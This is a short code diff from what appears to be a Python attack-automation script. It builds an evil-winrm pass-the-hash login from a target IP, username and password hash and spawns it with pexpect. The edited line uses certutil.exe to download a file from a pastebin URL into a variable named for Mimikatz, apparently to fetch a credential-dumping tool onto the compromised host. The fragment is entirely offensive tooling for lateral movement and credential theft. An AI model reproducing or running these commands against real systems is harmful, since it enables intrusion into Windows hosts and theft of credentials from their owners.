@@ -12,7 +12,7 @@
 
       command = f"evil-winrm -i {target_ip} -u {username} -H {hash}"
 
-      upload_mimikatz="certutil.exe -urlcache -f https://pastebin.com/ayrHaaNp"
+      upload_mimikatz="certutil.exe -urlcache -f https://pastebin.com/ayrHaaNp sample.ps1"
 
       winrm=f'PS \x1b[0mC:\\Users\\{username}\\Documents> '
       child = pexpect.spawn(command)
